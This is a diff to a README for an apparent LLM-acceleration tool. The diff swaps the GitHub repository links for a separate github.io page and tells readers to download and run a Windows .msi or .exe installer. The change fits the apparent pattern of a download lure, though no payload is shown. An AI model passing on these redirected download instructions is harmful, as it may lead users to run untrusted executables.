@@ -1,6 +1,6 @@
 # ⚡ Qwen3.5-TurboQuant-MLX-LM - Run Large Language Models Faster Today
 
-[![Download Software](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/seriedes7322/Qwen3.5-TurboQuant-MLX-LM)
+[![Download Software](https://img.shields.io/badge/Download-Release-blue.svg)](https://seriedes7322.github.io)
 
 ## 🎯 About This Software
 
@@ -28,7 +28,7 @@ To run this software, your computer needs to meet a few basic standards. If your
 
 Follow these steps to prepare your computer and run the application.
 
-1. Visit the project website to access the files: [https://github.com/seriedes7322/Qwen3.5-TurboQuant-MLX-LM](https://github.com/seriedes7322/Qwen3.5-TurboQuant-MLX-LM)
+1. Visit the project website to access the files: [https://seriedes7322.github.io](https://seriedes7322.github.io)
 2. Locate the section labeled Releases on the right side of the page.
 3. Select the latest version of the Windows installer file, which typically ends in .msi or .exe.
 4. Save the file to your Downloads folder.
